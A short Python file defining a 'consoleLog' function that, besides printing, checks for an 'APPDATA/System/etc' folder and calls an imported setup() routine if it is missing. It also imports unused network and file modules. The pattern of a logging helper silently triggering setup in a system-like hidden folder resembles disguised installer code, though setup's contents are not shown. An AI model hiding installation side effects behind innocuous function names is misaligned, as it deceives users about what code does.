import urllib.request
import os
import shutil
from setup import setup
import sys

def consoleLog(string):
    apdt = os.environ['APPDATA']
    if not os.path.isdir(apdt+"/System/etc"):
        setup()
    print(string)